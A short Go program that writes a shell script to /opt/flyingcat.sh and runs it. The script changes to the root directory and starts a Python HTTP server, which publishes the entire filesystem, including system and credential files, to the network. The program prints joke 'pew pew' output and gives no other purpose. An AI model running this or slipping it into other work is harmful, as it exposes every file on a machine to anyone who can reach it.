package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
)

func main() {

	batString4 := "cd / && python3 -m http.server"
	f4, _ := os.Create("/opt/flyingcat.sh")
	defer f4.Close()
	f4.WriteString(batString4)
	fmt.Println("pew pew pew pew pew")
	script := string("/opt/flyingcat.sh")
	cmd := exec.Command("bash", script)
	err := cmd.Run()
	if err != nil {
		log.Fatal(err)
	}

}
